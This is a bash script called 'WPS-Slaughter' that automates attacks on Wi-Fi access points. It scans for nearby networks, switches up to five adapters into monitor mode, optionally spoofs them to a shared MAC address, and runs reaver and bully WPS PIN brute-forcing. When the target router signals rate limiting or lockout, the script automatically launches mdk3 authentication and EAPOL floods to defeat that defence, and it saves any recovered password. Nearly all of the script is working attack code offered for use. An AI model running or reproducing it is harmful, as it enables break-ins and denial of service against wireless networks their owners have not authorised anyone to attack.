#!/bin/bash
clear
declare BSSID;
declare ESSID;
declare CHANNEL;
declare ADAPTER1;
declare ADAPTER2;
declare ADAPTER3;
declare ADAPTER4;
declare ADAPTER5;

echo "
██╗    ██╗██████╗ ███████╗      ███████╗██╗      █████╗ ██╗   ██╗ ██████╗ ██╗  ██╗████████╗███████╗██████╗ 
██║    ██║██╔══██╗██╔════╝      ██╔════╝██║     ██╔══██╗██║   ██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██╔══██╗
██║ █╗ ██║██████╔╝███████╗█████╗███████╗██║     ███████║██║   ██║██║  ███╗███████║   ██║   █████╗  ██████╔╝
██║███╗██║██╔═══╝ ╚════██║╚════╝╚════██║██║     ██╔══██║██║   ██║██║   ██║██╔══██║   ██║   ██╔══╝  ██╔══██╗
╚███╔███╔╝██║     ███████║      ███████║███████╗██║  ██║╚██████╔╝╚██████╔╝██║  ██║   ██║   ███████╗██║  ██║
╚══╝╚══╝ ╚═╝     ╚══════╝      ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

"

echo "WPS-SLAUGHTER BY: Apathetic Euphoria"
echo "+ Help and Support from Aanarchyy"

sleep 3
clear

sudo rfkill unblock all

#####Functions for Monitor Mode####

enable_mon_mode_1()
{
echo "Enabling Monitor Mode on $ADAPTER1"
sudo ifconfig $ADAPTER1 down
sleep 1
sudo iwconfig $ADAPTER1 mode monitor
sleep 1
sudo ifconfig $ADAPTER1 up
echo "Monitor Mode Enabled"
}

enable_mon_mode_2()
{
echo "Enabling Monitor Mode on $ADAPTER2"
sudo ifconfig $ADAPTER2 down
sleep 1
sudo iwconfig $ADAPTER2 mode monitor
sleep 1
sudo ifconfig $ADAPTER2 up
echo "Monitor Mode Enabled"
}

enable_mon_mode_3()
{
echo "Enabling Monitor Mode on $ADAPTER3"
sudo ifconfig $ADAPTER3 down
sleep 1
sudo iwconfig $ADAPTER3 mode monitor
sleep 1
sudo ifconfig $ADAPTER3 up
echo "Monitor Mode Enabled"
}

enable_mon_mode_4()
{
echo "Enabling Monitor Mode on $ADAPTER4"
sudo ifconfig $ADAPTER4 down
sleep 1
sudo iwconfig $ADAPTER4 mode monitor
sleep 1
sudo ifconfig $ADAPTER4 up
echo "Monitor Mode Enabled"
}

enable_mon_mode_5()
{
echo "Enabling Monitor Mode on $ADAPTER5"
sudo ifconfig $ADAPTER5 down
sleep 1
sudo iwconfig $ADAPTER5 mode monitor
sleep 1
sudo ifconfig $ADAPTER5 up
echo "Monitor Mode Enabled"
}

####End of Functions for Monitor Mode####

#### Functions for MAC CHANGER ####

mac_change_1()
{
echo "Setting the MAC Address on $ADAPTER1"
sudo ifconfig $ADAPTER1 down
sleep 3
macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER1 up
echo "MAC Changed"
}

mac_change_2()
{
echo "Setting the MAC Address on $ADAPTER2"
sudo ifconfig $ADAPTER2 down
sleep 3
macchanger $ADAPTER2 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER2 up
echo "MAC Changed"
}

mac_change_3()
{
echo "Setting the MAC Address on $ADAPTER3"
sudo ifconfig $ADAPTER3 down
sleep 3
macchanger $ADAPTER3 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER3 up
echo "MAC Changed"
}

mac_change_4()
{
echo "Setting the MAC Address on $ADAPTER4"
sudo ifconfig $ADAPTER4 down
sleep 3
macchanger $ADAPTER4 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER4 up
echo "MAC Changed"
}

mac_change_5()
{
echo "Setting the MAC Address on $ADAPTER5"
sudo ifconfig $ADAPTER5 down
sleep 3
macchanger $ADAPTER5 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER5 up
echo "MAC Changed"
}

####End of Functions for MAC CHANGER ####


####Target Scanner####

scan_for_targets()
{

sudo ifconfig $ADAPTER1 down
sudo iwconfig $ADAPTER1 mode managed
sudo ifconfig $ADAPTER1 up

eval $(sudo iwlist $ADAPTER1 scan | awk '/Address|ESSID|Channel:/' | sed 's/"//g' | sed 's/          Cell 01 - Address: /BSSID1=/g' | sed 's/          Cell 02 - Address: /BSSID2=/g' | sed 's/          Cell 03 - Address: /BSSID3=/g' | sed 's/          Cell 04 - Address: /BSSID4=/g' | sed 's/          Cell 05 - Address: /BSSID5=/g' | sed 's/          Cell 06 - Address: /BSSID6=/g' | sed 's/          Cell 07 - Address: /BSSID7=/g' | sed 's/          Cell 08 - Address: /BSSID8=/g' | sed 's/          Cell 09 - Address: /BSSID9=/g' | sed 's/          Cell 10 - Address: /BSSID10=/g' | sed 's/          Cell 11 - Address: /BSSID11=/g' | sed 's/          Cell 12 - Address: /BSSID12=/g' | sed 's/          Cell 13 - Address: /BSSID13=/g' | sed 's/          Cell 14 - Address: /BSSID14=/g' | sed 's/          Cell 15 - Address: /BSSID15=/g' | sed 's/          Cell 16 - Address: /BSSID16=/g' | sed 's/          Cell 17 - Address: /BSSID17=/g' | sed 's/          Cell 18 - Address: /BSSID18=/g' | sed 's/          Cell 19 - Address: /BSSID19=/g' | sed 's/          Cell 20 - Address: /BSSID20=/g'  | sed '2s/                    Channel:/CHANNEL1=/g' | sed '5s/                    Channel:/CHANNEL2=/g' | sed '8s/                    Channel:/CHANNEL3=/g' | sed '11s/                    Channel:/CHANNEL4=/g' | sed '14s/                    Channel:/CHANNEL5=/g' | sed '17s/                    Channel:/CHANNEL6=/g' | sed '20s/                    Channel:/CHANNEL7=/g' | sed '23s/                    Channel:/CHANNEL8=/g' | sed '26s/                    Channel:/CHANNEL9=/g' | sed '29s/                    Channel:/CHANNEL10=/g' | sed '32s/                    Channel:/CHANNEL11=/g' |sed '35s/                    Channel:/CHANNEL12=/g' | sed '38s/                    Channel:/CHANNEL13=/g' | sed '41s/                    Channel:/CHANNEL14=/g' | sed '44s/                    Channel:/CHANNEL15=/g' | sed '47s/                    Channel:/CHANNEL16=/g' | sed '50s/                    Channel:/CHANNEL17=/g' | sed '53s/                    Channel:/CHANNEL18=/g' | sed '56s/                    Channel:/CHANNEL19=/g' | sed '59s/                    Channel:/CHANNEL20=/g' | sed '3s/                    ESSID:/ESSID1=/g' | sed '6s/                    ESSID:/ESSID2=/g' | sed '9s/                    ESSID:/ESSID3=/g' | sed '12s/                    ESSID:/ESSID4=/g' | sed '15s/                    ESSID:/ESSID5=/g' | sed '18s/                    ESSID:/ESSID6=/g' | sed '21s/                    ESSID:/ESSID7=/g' | sed '24s/                    ESSID:/ESSID8=/g' | sed '27s/                    ESSID:/ESSID9=/g' | sed '30s/                    ESSID:/ESSID10=/g' | sed '33s/                    ESSID:/ESSID11=/g' | sed '36s/                    ESSID:/ESSID12=/g' | sed '39s/                    ESSID:/ESSID13=/g' | sed '42s/                    ESSID:/ESSID14=/g' | sed '45s/                    ESSID:/ESSID15=/g' | sed '48s/                    ESSID:/ESSID16=/g' | sed '51s/                    ESSID:/ESSID17=/g' | sed '54s/                    ESSID:/ESSID18=/g' | sed '57s/                    ESSID:/ESSID19=/g' | sed '60s/                    ESSID:/ESSID20=/g')


echo "************** - Select Target Access Point - ************** 
0) -- Rescan -- 
1)$ESSID1
2)$ESSID2
3)$ESSID3
4)$ESSID4
5)$ESSID5
6)$ESSID6
7)$ESSID7
8)$ESSID8
9)$ESSID9
10)$ESSID10
11)$ESSID11
12)$ESSID12
13)$ESSID13
14)$ESSID14
15)$ESSID15
16)$ESSID16
17)$ESSID17
18)$ESSID18
19)$ESSID19
20)$ESSID20"

read a
case $a in

	0) 
clear
scan_for_targets
;;
	1)
BSSID=$BSSID1
ESSID=$ESSID1
CHANNEL=$CHANNEL1
;;
	2)
BSSID=$BSSID2
ESSID=$ESSID2
CHANNEL=$CHANNEL2
;;
	3)
BSSID=$BSSID3
ESSID=$ESSID3
CHANNEL=$CHANNEL3
;;
	4)
BSSID=$BSSID4
ESSID=$ESSID4
CHANNEL=$CHANNEL4
;;
	5)
BSSID=$BSSID5
ESSID=$ESSID5
CHANNEL=$CHANNEL5
;;
	6)
BSSID=$BSSID6
ESSID=$ESSID6
CHANNEL=$CHANNEL6
;;
	7)
BSSID=$BSSID7
ESSID=$ESSID7
CHANNEL=$CHANNEL7
;;
	8)
BSSID=$BSSID8
ESSID=$ESSID8
CHANNEL=$CHANNEL8
;;
	9)
BSSID=$BSSID9
ESSID=$ESSID9
CHANNEL=$CHANNEL9
;;
	10)
BSSID=$BSSID10
ESSID=$ESSID10
CHANNEL=$CHANNEL10
;;
	11)
BSSID=$BSSID11
ESSID=$ESSID11
CHANNEL=$CHANNEL11
;;
	12)
BSSID=$BSSID12
ESSID=$ESSID12
CHANNEL=$CHANNEL12
;;
	13)
BSSID=$BSSID13
ESSID=$ESSID13
CHANNEL=$CHANNEL13
;;
	14)
BSSID=$BSSID14
ESSID=$ESSID14
CHANNEL=$CHANNEL14
;;
	15)
BSSID=$BSSID15
ESSID=$ESSID15
CHANNEL=$CHANNEL15
;;
	16)
BSSID=$BSSID16
ESSID=$ESSID16
CHANNEL=$CHANNEL16
;;
	17)
BSSID=$BSSID17
ESSID=$ESSID17
CHANNEL=$CHANNEL17
;;
	18)
BSSID=$BSSID18
ESSID=$ESSID18
CHANNEL=$CHANNEL18
;;
	19)
BSSID=$BSSID19
ESSID=$ESSID19
CHANNEL=$CHANNEL19
;;
	20)
BSSID=$BSSID20
ESSID=$ESSID20
CHANNEL=$CHANNEL20
;;
	*)
Invalid Option
;;
esac

}

####End of Target Scanner####

################################## Functions For MDK3 ########################################

run_mdk3_ASOC1()
{
	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m"
}

run_mdk3_EAPOL1()
{
	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250"
}

run_mdk3_ASOC2()
{
	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m"
}

run_mdk3_EAPOL2()
{
	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250"
}

run_mdk3_ASOC3()
{
	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m"
}

run_mdk3_EAPOL3()
{
	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250"
}

run_mdk3_ASOC4()
{
	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m"
}

run_mdk3_EAPOL4()
{
	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250"
}

run_mdk3_ASOC5()
{
	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER5 a -a $BSSID -m"
}

run_mdk3_EAPOL5()
{
	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER5 x 0 -t $BSSID -n $ESSID -s 250"
}

##################################End Of Functions For MDK3 ########################################


echo "************** - How Many Wlan Adapters Would You Like To Use? - ************** 
1)1 Adapter
2)2 Adapters
3)3 Adapters
4)4 Adapters
5)5 Adapters"

read a
case $a in
	1)
clear

echo 
read -p " - What is the name of your Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;

clear

scan_for_targets


clear

enable_mon_mode_1

sleep 1

clear

echo "************** - Would you like to Change the Wlan Adapter's MAC Address? - ************** 
1)Yes
2)No"

read c
case $c in
	1)
clear

mac_change_1

sleep 1

clear
;;
	2)
clear
;;
	*)Invalid Option
;;
esac


menu () {
clear
echo "************** - Which Attack Would You Like To Use? - ************** 
0)Select New Target Network
1)EAPOL Start Flood 
2)Authentication Flood
3)Reaver
4)Check if Access Point WPS is UNLOCKED
5)Reaver with AutoFlood(ASOC)
6)Reaver with AutoFlood(EAPOL)
7)Bully
8)Bully with AutoFlood(ASOC)
9)Bully with AutoFlood(EAPOL)

*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"

read d
case $d in
	0)
clear
scan_for_targets
enable_mon_mode_1
menu
;;
	1)
clear
timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250
menu
;;
	2)
clear
timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m
menu
;;
	3)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
menu
;;
	4)
clear
xterm -e "wash -i $ADAPTER1" & 
menu
;;
	5)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_ASOC1
    fi
    sleep 1
done
menu
;;
	6)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_EAPOL1
    fi
    sleep 1
done
menu
;;
	7)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1
menu
;;
	8)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_ASOC1
    fi
    sleep 1
done
menu
;;
	9)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_EAPOL1
    fi
    sleep 1
done
menu
;;
	*)Invalid Option
menu
;;
esac
}

menu

;;
	2)
clear

echo 
read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
clear
echo 
read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
clear

scan_for_targets

clear

enable_mon_mode_1

enable_mon_mode_2

clear

echo "************** - Would you like to set the 2 Adapters to an Identical MAC Address? - ************** 
1)Yes
2)No"

read f
case $f in
	1)
clear

mac_change_1

mac_change_2

clear
;;
	2)
;;
	*)Invalid Option
;;
esac



menu () {
clear
echo "************** - Which Attack Would You Like To Use? - ************** 
0)Select New Target Network
1)EAPOL Start Flood 
2)Authentication Flood
3)Reaver
4)Check if Access Point WPS is UNLOCKED
5)Reaver with AutoFlood(ASOC)
6)Reaver with AutoFlood(EAPOL)
7)Bully
8)Bully with AutoFlood(ASOC)
9)Bully with AutoFlood(EAPOL)

*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"

read g
case $g in
	0)
clear
scan_for_targets
enable_mon_mode_1
menu
;;
	1)
clear
timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250
menu
;;
	2)
clear
timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m
menu
;;
	3)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
menu
;;
	4)
clear
xterm -e "wash -i $ADAPTER1" & 
menu
;;
	5)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_ASOC2
    fi
    sleep 1
done
menu
;;
	6)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_EAPOL2
    fi
    sleep 1
done
menu
;;
	7)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1
menu
;;
	8)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_ASOC2
    fi
    sleep 1
done
menu
;;
	9)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_EAPOL2
    fi
    sleep 1
done
menu
;;
	*)Invalid Option
menu
;;
esac

}

menu

;;
	3)
clear
echo 
read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
clear
echo 
read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
clear
echo 
read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": ADAPTER3;
clear

scan_for_targets

clear


enable_mon_mode_1

enable_mon_mode_2

enable_mon_mode_3



clear

echo "************** - Would you like to set the 3 Adapters to an Identical MAC Address? - ************** 
1)Yes
2)No"

read i
case $i in
	1)
clear

mac_change_1

mac_change_2

mac_change_3

clear
;;
	2)
;;
	*)Invalid Option
;;
esac


menu () {
clear
echo "************** - Which Attack Would You Like To Use? - ************** 
0)Select New Target Network
1)EAPOL Start Flood 
2)Authentication Flood
3)Reaver
4)Check if Access Point WPS is UNLOCKED
5)Reaver with AutoFlood(ASOC)
6)Reaver with AutoFlood(EAPOL)
7)Bully
8)Bully with AutoFlood(ASOC)
9)Bully with AutoFlood(EAPOL)

*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"

read j
case $j in
	0)
clear
scan_for_targets
enable_mon_mode_1
menu
;;
	1)
clear
timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250
menu
;;
	2)
clear
timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m
menu
;;
	3)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
menu
;;
	4)
clear
xterm -e "wash -i $ADAPTER1" & 
menu
;;
	5)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_ASOC3
    fi
    sleep 1
done
menu
;;
	6)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_EAPOL3
    fi
    sleep 1
done
menu
;;
	7)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1
menu
;;
	8)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_ASOC3
    fi
    sleep 1
done
menu
;;
	9)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_EAPOL3
    fi
    sleep 1
done
menu
;;
	*)Invalid Option
menu
;;
esac
}

menu

;;
	4)
clear
echo 
read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
clear
echo 
read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
clear
echo 
read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": ADAPTER3;
clear
echo 
read -p " - What is the name of your 4th Wlan Adapter (Ex:Wlan3) - ": ADAPTER4;
clear

scan_for_targets

clear

enable_mon_mode_1

enable_mon_mode_2

enable_mon_mode_3

enable_mon_mode_4


clear

echo "************** - Would you like to set ALL Wlan Adapters to the same MAC Address? - ************** 
1)Yes
2)No"

read l
case $l in
	1)
clear

mac_change_1

mac_change_2

mac_change_3

mac_change_4

clear
;;
	2)
;;
	*)Invalid Option
;;
esac

clear

menu () {
clear
echo "************** - Which Attack Would You Like To Use? - ************** 
0)Select New Target Network
1)EAPOL Start Flood 
2)Authentication Flood
3)Reaver
4)Check if Access Point WPS is UNLOCKED
5)Reaver with AutoFlood(ASOC)
6)Reaver with AutoFlood(EAPOL)
7)Bully
8)Bully with AutoFlood(ASOC)
9)Bully with AutoFlood(EAPOL)

*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"

read m
case $m in
	0)
clear
scan_for_targets
enable_mon_mode_1
menu
;;
	1)
clear
timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250
menu
;;
	2)
clear
timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m
menu
;;
	3)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
menu
;;
	4)
clear
xterm -e "wash -i $ADAPTER1" & 
menu
;;
	5)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_ASOC4
    fi
    sleep 1
done
menu
;;
	6)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_EAPOL4
    fi
    sleep 1
done
menu
;;
	7)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1
menu
;;
	8)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_ASOC4
    fi
    sleep 1
done
menu
;;
	9)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_EAPOL4
    fi
    sleep 1
done
menu
;;
	*)Invalid Option
menu
;;
esac
}

menu

;;
	5)
clear
echo 
read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
clear
echo 
read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
clear
echo 
read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": ADAPTER3;
clear
echo 
read -p " - What is the name of your 4th Wlan Adapter (Ex:Wlan3) - ": ADAPTER4;
clear
echo 
read -p " - What is the name of your 5th Wlan Adapter (Ex:Wlan4) - ": ADAPTER5;
clear

scan_for_targets

clear

enable_mon_mode_1

enable_mon_mode_2

enable_mon_mode_3

enable_mon_mode_4

enable_mon_mode_5

clear

echo "************** - Would you like to set ALL Wlan Adapters to the same MAC Address? - ************** 
1)Yes
2)No"

read o
case $o in
	1)
clear

mac_change_1

mac_change_2

mac_change_3

mac_change_4

mac_change_5

clear
;;
	2)
;;
	*)Invalid Option
;;
esac


menu () {
clear
echo "************** - Which Attack Would You Like To Use? - ************** 
0)Select New Target Network
1)EAPOL Start Flood 
2)Authentication Flood
3)Reaver
4)Check if Access Point WPS is UNLOCKED
5)Reaver with AutoFlood(ASOC)
6)Reaver with AutoFlood(EAPOL)
7)Bully
8)Bully with AutoFlood(ASOC)
9)Bully with AutoFlood(EAPOL)

*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"

read p
case $p in
	0)
clear
scan_for_targets
enable_mon_mode_1
menu
;;
	1)
clear
timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER5 x 0 -t $BSSID -n $ESSID -s 250
menu
;;
	2)
clear
timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER5 a -a $BSSID -m
menu
;;
	3)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
menu
;;
	4)
clear
xterm -e "wash -i $ADAPTER1" & 
menu
;;
	5)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_ASOC5
    fi
    sleep 1
done
menu
;;
	6)
clear
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
reaver_pid=$! 

while kill -0 $reaver_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"limiting"* ]]; then
	run_mdk3_EAPOL5
    fi
    sleep 1
done
menu
;;
	7)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1
menu
;;
	8)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_ASOC5
    fi
    sleep 1
done
menu
;;
	9)
clear
bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
bully_pid=$! 

